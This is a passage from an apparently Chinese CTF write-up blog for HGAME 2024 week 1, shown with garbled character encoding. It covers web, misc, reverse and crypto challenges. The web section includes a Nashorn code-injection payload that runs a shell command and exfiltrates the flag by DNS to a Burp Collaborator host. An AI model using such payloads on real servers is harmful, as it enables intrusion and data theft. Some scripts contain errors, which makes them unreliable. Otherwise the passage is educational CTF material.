src="/2024/01/30/hgame-week1/12.png" class="" title="alt text"><br>åœ¨ç½‘ä¸ŠæŸ¥ä¸€ä¸‹è¿™ä¸ªæŠ¥é”™å‘ç°è¿™ä¸ªæ˜¯Nashorn JavaScriptçš„æŠ¥é”™<br>æ—¢ç„¶å­˜åœ¨æŠ¥é”™é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä½¿ç”¨javaè¯­å¥å‘¢ï¼Ÿå°è¯•ä¸€ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var command = [&quot;bash&quot;, &quot;-c&quot;,&quot;cat flag&quot;];</span><br><span class="line">var processBuilder = new java.lang.ProcessBuilder(command);</span><br></pre></td></tr></table></figure><br>è¿”å›ä¸ºNULLæ²¡æœ‰æŠ¥é”™è¯æ˜äº†è¯¥ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦ä½¿ç”¨DNSå¤–å¸¦å¾—åˆ°æ•°æ®ï¼Œæˆ‘ç”¨çš„æ˜¯bpçš„Collaboratoræ¨¡å—ï¼Œ</p><p>4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.comæ˜¯åœ¨Collaboratorå‰ªåˆ‡çš„<br><img src="/2024/01/30/hgame-week1/13.png" class="" title="alt text"><br>æˆ‘ä»¬åªè¦pingè¿™ä¸ªåœ°å€å°±ä¼šäº§ç”Ÿæ—¥å¿—ï¼Œè€Œæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ–¹å¼pingå°±ä¼šå°†æ•°æ®å¤–å¸¦<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;ping `cat flag`.4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.com&quot;</span><br></pre></td></tr></table></figure><br>paylaodå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var command = [&quot;bash&quot;, &quot;-c&quot;, &quot;ping `cat flag`.4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.com&quot;];</span><br><span class="line">var processBuilder = new java.lang.ProcessBuilder(command).start();</span><br></pre></td></tr></table></figure><br><img src="/2024/01/30/hgame-week1/14png.png" class="" title="alt text"><br>æˆåŠŸå¤–å¸¦flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>å‘ä¸ªå…¬ä¼—å·å°±å¯ä»¥äº†</p><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>ç”¨ä½ çš„æ—¶é—´æ‰“å¼€è¿™ä¸ªé™„ä»¶ï¼Œæ–œç€çœ‹å°±å¯ä»¥äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å·¥å…·è°ƒé€è§†ã€‚</p><h2 id="å¸Œå„¿å¸Œå„¿å¸Œå°”"><a href="#å¸Œå„¿å¸Œå„¿å¸Œå°”" class="headerlink" title="å¸Œå„¿å¸Œå„¿å¸Œå°”"></a>å¸Œå„¿å¸Œå„¿å¸Œå°”</h2><p>çœ‹é¢˜ç›®æè¿°æˆ‘ä»¬å¯ä»¥çŒœæµ‹éœ€è¦ç”¨åˆ°å¸Œå°”åŠ å¯†<br>é™„ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡æ ¼å¼ä¸ºpngï¼Œç”¨010æ‰“å¼€é™„ä»¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æœ€å°¾éƒ¨ä¸ä¸ºå›¾ç‰‡çš„æ–‡ä»¶å°¾<br>æ–‡ä»¶å¤´å°¾å¦‚ä¸‹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åç¼€å     æ–‡ä»¶å¤´    æ–‡ä»¶å°¾</span><br><span class="line">jpg/jpeg ffd8ffe0   ffd9</span><br><span class="line">png      89504e47   ae426082</span><br><span class="line">gif    474946383961 003b</span><br><span class="line">zip    504b0304     504b</span><br><span class="line">rar    52617221     æ— </span><br></pre></td></tr></table></figure><br><img src="/2024/01/30/hgame-week1/15.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°å›¾ç‰‡çš„æ–‡ä»¶å°¾åè¿˜æœ‰ä¸€ç«¯ï¼Œå…¶å¼€å¤´ä¸º504b0304ä¸ºzipæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥å°†å…¶æå–å‡ºæ¥ã€‚è§£å‹åæ˜¯ä¸€ä¸²å¯†æ–‡ï¼Œæ ¹æ®é¢˜ç›®çš„æè¿°æˆ‘ä»¬å¯ä»¥çŒœæµ‹ç€ä¸ªä¸ºå¸Œå°”åŠ å¯†åçš„å¯†æ–‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°keyå°±åº”è¯¥å¯ä»¥å¾—åˆ°flagäº†ã€‚<br>å†å°†å›¾ç‰‡å¡å…¥StegSolveå¯ä»¥å‘ç°æŠ¥é”™äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŒœæµ‹è¿™ä¸ªæ–‡ä»¶çš„å®½é«˜åº”è¯¥è¢«ä¿®æ”¹äº†ï¼ˆå…¶å®ç›´æ¥çœ‹æ–‡ä»¶çš„é•¿å®½ä¹Ÿå¯ä»¥çŒœå‡ºæ¥å› ä¸º1444x1444å¤ªä¸å‰åˆ©äº†ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å›¾ç‰‡çš„CRCæ ¡éªŒç è§£æä¿®å¤ï¼Œè¿™é‡Œç›´æ¥è´´è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    m=f.read()</span><br><span class="line">sign=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c=m[<span class="number">12</span>:<span class="number">16</span>]+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc=binascii.crc32(c)&amp;<span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc==<span class="number">0x121B804D</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br><span class="line">            sign=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> sign==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>åˆ©ç”¨ä¸Šè¿°è„šæœ¬è®¡ç®—å‡ºå®½é«˜ä¿®æ”¹å³å¯ã€‚<br>ä»£è¡¨å›¾ç‰‡å®½é«˜çš„æ˜¯IHDRåä¸€ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°å‰å4æ¯”ç‰¹å„ä»£è¡¨äº†å®½é«˜<br><img src="/2024/01/30/hgame-week1/16.png" class="" title="alt text"><br>ä¿®å¤åæ‰”åˆ°StegSolveåˆ©ç”¨LSBæ¥æŸ¥çœ‹éšå†™çš„å†…å®¹<br><img src="/2024/01/30/hgame-week1/17.png" class="" title="alt text"><br>ä¹‹åå°±ç›´æ¥ä½¿ç”¨bugkuçš„å¸Œå°”è§£å¯†å°±å¯ä»¥å¾—åˆ°å¼—æ‹‰æ ¼</p><h2 id="simple-attackk"><a href="#simple-attackk" class="headerlink" title="simple_attackk"></a>simple_attackk</h2><p>æŸ¥çœ‹é™„ä»¶ï¼Œæœ‰ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€ä¸ªå›¾ç‰‡<br>ä½¿ç”¨BandizipæŸ¥çœ‹æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°zipçš„å‹ç¼©ç®—æ³•ï¼Œå¹¶ä¸”å‹ç¼©åŒ…å†…éƒ¨æœ‰ä¸€ä¸ªå’Œå¦ä¸€ä¸ªé™„ä»¶å®Œå…¨ç›¸åŒçš„å›¾ç‰‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨æ˜æ–‡çˆ†ç ´ã€‚<br>æ˜æ–‡çˆ†ç ´éœ€è¦ä½¿ç”¨ç›¸åŒçš„åŠ å¯†ç®—æ³•å³å‹ç¼©åçš„å›¾ç‰‡ä¸‹é¢ä¸‰é¡¹è¦ä¸ç ´å¯†å‹ç¼©åŒ…çš„ç›¸åŒ<br><img src="/2024/01/30/hgame-week1/18.png" class="" title="alt text"><br>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ARCHPRæ¥æ˜æ–‡çˆ†ç ´<br><img src="/2024/01/30/hgame-week1/19.png" class="" title="alt text"><br>åªè¦èƒ½å¼€å§‹è§£å¯†å³ä»£è¡¨ï¼ŒåŠ å¯†ç®—æ³•ç­‰ç›¸åŒ<br>å¼€å§‹è§£å¯†åç›´æ¥ç‚¹å‡»åœæ­¢ï¼Œåªè¦èƒ½åœæ­¢ä¸€èˆ¬å°±ä»£è¡¨ç ´è¯‘æˆåŠŸ<br>è§£å¯†å‹ç¼©åŒ…åç‚¹å¡æ–‡æœ¬<br><img src="/2024/01/30/hgame-week1/20.png" class="" title="alt text"><br>æç¤ºæˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªbase64åŠ å¯†çš„å›¾ç‰‡ï¼Œç›´æ¥æœç´¢base64è½¬å›¾ç‰‡çš„ç½‘ç«™å³å¯å¾—åˆ°flag</p><h2 id="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"><a href="#æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™" class="headerlink" title="æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"></a>æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™</h2><p>å¾—åˆ°é™„ä»¶ï¼Œé¢˜ç›®æè¿°éœ€è¦è§£å¯†ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªè§£å¯†å·¥å…·å«Stegseekï¼Œè¿™ä¸ªå·¥å…·æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„è§£å¯†è½¯ä»¶ï¼Œæ¯ç§’å¯ä»¥è·‘ç™¾ä¸‡ä¸ªå¯†ç ï¼Œå¯ä»¥å¿«é€Ÿçš„è·‘å®Œä¸€ä¸ªéå¸¸å¼ºå¤§çš„å­—å…¸<br>ä½¿ç”¨ä»–çš„-sfå³å¯è¿›è¡Œçˆ†ç ´<br><img src="/2024/01/30/hgame-week1/21.png" class="" title="alt text"><br>å¾—åˆ°å¯†ç åå†ä½¿ç”¨steghideè¿›è¡Œè§£å¯†<br>æå–å‡ºæ¥åä¸ºå‹ç¼©æ–‡ä»¶è§£å‹åï¼Œä¸ºä¸€ä¸ªwebæºç å’Œå›¾ç‰‡ã€‚<br><img src="/2024/01/30/hgame-week1/23.png" class="" title="alt text"><br><img src="/2024/01/30/hgame-week1/24.png" class="" title="alt text"><br>è¯¥å›¾ç‰‡æ˜¯ä¸€ä¸²å¯†æ–‡ï¼Œæ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬å»è¯¥æ¸¸æˆçš„å®˜ç½‘æŸ¥çœ‹ï¼Œå¯ä»¥å‘ç°è¯¥æ–‡å­—ä¸ºæ¸¸æˆçš„æ–‡å­—ã€‚æˆ‘ä»¬æ‰“å¼€f12æŸ¥æ‰¾ttfæ–‡ä»¶(ttfæ–‡ä»¶æ˜¯ä¸€ç§å­—ä½“æ–‡ä»¶)æ‰¾åˆ°åä¸‹è½½ï¼Œä¸Šä¼ åˆ°é¢˜ç›®ç»™çš„webé¡µé¢è¿›è¡Œè§£æï¼Œå†è¾“å…¥å®½è¾“å…¥å­—æ¯å’Œä¸‹åˆ’çº¿ï¼Œä¸€ä¸€å¯¹ç…§å°±èƒ½ç ´è§£å‡ºflagã€‚</p><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><h2 id="è¯´å®è¯è¿™ä¸ªweek1çš„é€†å‘æ˜¯çœŸçš„å¤Ÿç®€å•çš„æˆ‘é›¶åŸºç¡€ï¼Œåªæ˜¯å†ç½‘ä¸Šç¨å¾®æŸ¥ä¸€ä¸‹å°±è½»æ¾akäº†"><a href="#è¯´å®è¯è¿™ä¸ªweek1çš„é€†å‘æ˜¯çœŸçš„å¤Ÿç®€å•çš„æˆ‘é›¶åŸºç¡€ï¼Œåªæ˜¯å†ç½‘ä¸Šç¨å¾®æŸ¥ä¸€ä¸‹å°±è½»æ¾akäº†" class="headerlink" title="è¯´å®è¯è¿™ä¸ªweek1çš„é€†å‘æ˜¯çœŸçš„å¤Ÿç®€å•çš„æˆ‘é›¶åŸºç¡€ï¼Œåªæ˜¯å†ç½‘ä¸Šç¨å¾®æŸ¥ä¸€ä¸‹å°±è½»æ¾akäº†"></a>è¯´å®è¯è¿™ä¸ªweek1çš„é€†å‘æ˜¯çœŸçš„å¤Ÿç®€å•çš„æˆ‘é›¶åŸºç¡€ï¼Œåªæ˜¯å†ç½‘ä¸Šç¨å¾®æŸ¥ä¸€ä¸‹å°±è½»æ¾akäº†</h2><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ç›´æ¥å¡åˆ°IDAé‡Œå°±æ˜¯flag</p><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>æˆ‘ä»¬å¾—åˆ°é™„ä»¶æ”¾åˆ°ExeinfoæŸ¥çœ‹å…¶ä¿¡æ¯<br><img src="/2024/01/30/hgame-week1/25.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ç”¨UPXæ‰“åŒ…çš„ï¼Œæˆ‘ä»¬ç›´æ¥å†ç½‘ä¸Šä¸‹è½½UPXå¯¹å…¶è¿›è¡Œè„±å£³ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPX -d æ–‡ä»¶ç›¸å¯¹åœ°å€</span><br></pre></td></tr></table></figure><br>è„±å£³åä½¿ç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼Œè½¬æˆä¼ªcä»£ç ï¼Œå‘ç°æ˜¯<br><img src="/2024/01/30/hgame-week1/26.png" class="" title="alt text"><br>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å¼‚æˆ–ä¸Š0x32ç­‰äºå˜é‡byte_1400022A0å³ä¸ºflagï¼Œä¸€ä¸ªæ•°å¼‚æˆ–ä¸¤æ¬¡å°±ä¼šå˜å›åŸæ¥çš„æ•°ã€‚<br>æˆ‘ä»¬åŒå‡»byte_1400022A0ç„¶åSHIFT+eå°±å¯ä»¥æå–å…¶å€¼ï¼Œç„¶åå°†æ¯ä¸ªå€¼éƒ½å¼‚æˆ–ä¸Š0x32å³å¯å¾—åˆ°flagè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=[<span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x73</span>,<span class="number">0x60</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x5D</span>,<span class="number">0x45</span>, <span class="number">0x13</span>, <span class="number">0x6B</span>, <span class="number">0x02</span>,<span class="number">0x47</span>, <span class="number">0x6D</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>,<span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x5E</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, <span class="number">0x6D</span>, <span class="number">0x67</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">100</span>)</span><br><span class="line">flag+=(c[i]^<span class="number">0x32</span>)</span><br></pre></td></tr></table></figure></p><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>æ‰“å¼€æ–‡ä»¶æ˜¯ä¸€ä¸ªæ±‡ç¼–è¯­è¨€<br><img src="/2024/01/30/hgame-week1/28.png" class="" title="alt text"><br>å…¶å¤§è‡´æ„æ€å°±æ˜¯è¾“å…¥çš„å­—ç¬¦å¼‚æˆ–ä¸Š0x22ç­‰äºcå³ä¸ºflagï¼Œé‚£ä¹ˆåŒæ ·ç›´æ¥å†™è„šæœ¬å³å¯</p><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>è¿™æ˜¯ä¸€ä¸ªpythonçš„è„±å£³æˆ‘ä»¬å°†æ–‡ä»¶æ‰˜å…¥ExeinfoæŸ¥çœ‹å™¨æ‰“åŒ…ä¿¡æ¯<br><img src="/2024/01/30/hgame-week1/29.png" class="" title="alt text"><br>å¯ä»¥å‘ç°è¿™æ˜¯ç”±PyInstallerè¿›è¡Œæ‰“åŒ…çš„æ–‡ä»¶<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pyinstxtractor.pyè¿›è¡Œæå–</p><h3 id="æ­¥éª¤1"><a href="#æ­¥éª¤1" class="headerlink" title="æ­¥éª¤1."></a>æ­¥éª¤1.</h3><p>å°†éœ€è„±å£³æ–‡ä»¶å’Œpyinstxtractor.pyæ–‡ä»¶ç½®äºåŒä¸€æ–‡ä»¶å¤¹å†…,åœ¨è¯¥è·¯å¾„å†…æ‰“å¼€cmd</p><h3 id="æ­¥éª¤2-è·å–pycæ–‡ä»¶"><a href="#æ­¥éª¤2-è·å–pycæ–‡ä»¶" class="headerlink" title="æ­¥éª¤2.è·å–pycæ–‡ä»¶"></a>æ­¥éª¤2.è·å–pycæ–‡ä»¶</h3><p>python pyinstxtractor.py ezPYC.exe<br>å°±ä¼šå†æ–‡ä»¶é‡Œè¾“å‡ºezPYC.exe_extractedæ–‡ä»¶å¤¹ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°pyinstallerå’Œpythonçš„ç‰ˆæœ¬</p><h3 id="æ­¥éª¤3ä¿®å¤Magic-Head"><a href="#æ­¥éª¤3ä¿®å¤Magic-Head" class="headerlink" title="æ­¥éª¤3ä¿®å¤Magic Head"></a>æ­¥éª¤3ä¿®å¤Magic Head</h3><p>ä¸€èˆ¬è€Œè¨€,ä½¿ç”¨pyinstxtractorè§£åŒ…ä¼šè‡ªåŠ¨ä¿®å¤MagicHead,å¦‚æœæ²¡æœ‰è‡ªåŠ¨ä¿®å¤åˆ™æ‰‹åŠ¨ä¿®å¤</p><p>åœ¨æ–‡ä»¶å¤¹å†…æ‰¾åˆ°ezPYC.pycå’Œstruct.pycæ–‡ä»¶,ç”¨winhexæˆ–è€…010editoræ‰“å¼€,å°†structæ–‡ä»¶çš„ç¬¬ä¸€è¡Œ(Magic head)å¤åˆ¶åˆ°stream.pycçš„æœ€å‰é¢,ä¿å­˜æ›´æ”¹</p><p>ä¹‹åå†ç”¨IDAæ‰“å¼€ezPYC.pycæ–‡ä»¶å³å¯æŸ¥çœ‹mainå‡½æ•°å†…å®¹ï¼Œè½¬æˆä¼ªcä»£ç å³å¯å‘ç°å…¶è¿˜æ˜¯å¼‚æˆ–ã€‚</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>å…³äºrsaç®—æ³•å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ–‡ç« æˆ‘ä¸ªäººè®¤ä¸ºå†™çš„éå¸¸å¥½ï¼Œè¿™ä¸ªæ–‡ç« å°†rsaç®—æ³•çš„å‰ç½®çŸ¥è¯†è®²çš„å¾ˆæ¸…æ¥šï¼Œ<a href="https://blog.csdn.net/wjiabin/article/details/85228078">RSAç®—æ³•</a><br>æˆ‘ä»¬æ‰“å¼€é™„ä»¶<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><br>å‘ç°å…¶æ³„éœ²äº†<code>q^p%n</code>å’Œ<code>p^q%n</code><br>æ ¹æ®èŒƒé©¬å°å®šç†<br><img src="/2024/01/30/hgame-week1/30.png" class="" title="alt text"><br>ç”±äºpqäº’è´¨æ‰€ä»¥<code>q^p-1%n=1</code>ä¸¤è¾¹åŒæ—¶ä¹˜ä¸Šqå¾—<code>q^p%n=q</code>å¦ä¸€ä¸ªåŒç†åˆ™æˆ‘ä»¬å¾—åˆ°äº†qå’Œpçš„å€¼ã€‚<br>æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®på’Œqè¿˜æœ‰eç®—å‡ºå¯†é’¥dï¼Œæˆ‘ä»¬åªè¦æ±‚eå¯¹(q-1)(p-q)çš„æ¨¡åå…ƒç´ å³å¯è„šæœ¬å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex, b2a_hex</span><br><span class="line"></span><br><span class="line">flag = &quot;*****************&quot;</span><br><span class="line"></span><br><span class="line">p = 149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br><span class="line">q = 116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br><span class="line">c = 10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><span class="line">e = 65537</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(int(m)))</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢JavaScriptåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="å†™è¿™ç¯‡æ–‡ç« çš„åŸå› æ˜¯æˆ‘åœ¨æ”¾å¯’å‡ç»è¿‡äº†é•¿ä¹…çš„æ‘†çƒ‚åç—›å®šæ€ç—›ä¸èƒ½å†è¿™ä¹ˆä¸‹å»äº†ï¼Œå› ä¸ºæ˜å¤©å°±æ˜¯hgameäº†æ‰€æœ‰æˆ‘æƒ³ç€åˆ·ç‚¹hgameçš„å†…å®¹ï¼Œç»“æœæ‰¾ä¸åˆ°å¤ç°å¹³å°ï¼Œåªåœ¨NSSä¸Šæ‰¾åˆ°ä¸€äº›ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨å†™week4çš„Shared-Diary-Antel0p3æ—¶é‡åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œä¸€ç‚¹éƒ½ä¸ä¼šæ‰€ä»¥æˆ‘å°±æ‰“ç®—å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“ã€‚"><a href="#å†™è¿™ç¯‡æ–‡ç« çš„åŸå› æ˜¯æˆ‘åœ¨æ”¾å¯’å‡ç»è¿‡äº†é•¿ä¹…çš„æ‘†çƒ‚åç—›å®šæ€ç—›ä¸èƒ½å†è¿™ä¹ˆä¸‹å»äº†ï¼Œå› ä¸ºæ˜å¤©å°±æ˜¯hgameäº†æ‰€æœ‰æˆ‘æƒ³ç€åˆ·ç‚¹hgameçš„å†…å®¹ï¼Œç»“æœæ‰¾ä¸åˆ°å¤ç°å¹³å°ï¼Œåªåœ¨NSSä¸Šæ‰¾åˆ°ä¸€äº›ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨å†™week4çš„Shared-Diary-Antel0p3æ—¶é‡åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œä¸€ç‚¹éƒ½ä¸ä¼šæ‰€ä»¥æˆ‘å°±æ‰“ç®—å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“ã€‚" class="headerlink" title="å†™è¿™ç¯‡æ–‡ç« çš„åŸå› æ˜¯æˆ‘åœ¨æ”¾å¯’å‡ç»è¿‡äº†é•¿ä¹…çš„æ‘†çƒ‚åç—›å®šæ€ç—›ä¸èƒ½å†è¿™ä¹ˆä¸‹å»äº†ï¼Œå› 